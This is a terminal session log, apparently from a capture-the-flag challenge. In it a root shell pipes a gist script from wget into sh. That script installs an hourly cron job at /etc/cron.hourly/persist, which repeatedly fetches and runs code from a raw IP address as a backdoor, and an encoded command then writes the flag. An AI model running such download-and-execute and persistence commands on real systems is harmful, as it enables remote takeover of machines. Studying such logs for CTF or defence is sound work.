```
root@LAPTOP-4VD7KB18:~# sh -c "$(wget -O- https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh)"
--2020-11-21 18:50:25--  https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 151.101.12.133
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|151.101.12.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 249 [text/plain]
Saving to: ‘STDOUT’

-                                    100%[===================================================================>]     249  --.-KB/s    in 0s

2020-11-21 18:50:25 (2.86 MB/s) - written to stdout [249/249]

--2020-11-21 18:50:26--  http://188.143.222.218:4455/persist?uuid=UFcl4aVzlBume5L42MmSGBEXigbTB6Tn
Connecting to 188.143.222.218:4455... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://188.143.222.218:4455/persist/?uuid=UFcl4aVzlBume5L42MmSGBEXigbTB6Tn [following]
--2020-11-21 18:50:26--  http://188.143.222.218:4455/persist/?uuid=UFcl4aVzlBume5L42MmSGBEXigbTB6Tn
Reusing existing connection to 188.143.222.218:4455.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘/etc/cron.hourly/persist’

/etc/cron.hourly/persist                 [ <=>                                                                ]     154  --.-KB/s    in 0s

2020-11-21 18:50:26 (3.69 MB/s) - ‘/etc/cron.hourly/persist’ saved [154]

root@LAPTOP-4VD7KB18:~# cat /etc/cron.hourly/persist

#!/bin/sh
UUID = `cat /etc/persist`
BASE="http://188.143.222.218:4455/?uuid="
logger -s "Started door with uid $UUID"
sh -c "$(wget -O- $BASE$NEW_UUID)"
root@LAPTOP-4VD7KB18:~# sh -c "`echo ZWNobyBPTllHRVkzVU1aNVdXTVpUT0JQWFNNRFZPSlBXTTVEUUw1WlRJWlJUUFVGQT09PT0gfCBiYXNlMzIgLWQgPiAvZXRjL3NlY3JldC5mbGFnCg== | base64 -d`"
echo ONYGEY3UMZ5WWMZTOBPXSMDVOJPWM5DQL5ZTIZRTPUFA==== | base32 -d > /etc/secret.flag
root@LAPTOP-4VD7KB18:~# cat /etc/secret.flag
spbctf{k33p_y0ur_ftp_s4f3}
root@LAPTOP-4VD7KB18:~#                                                                                                                          
```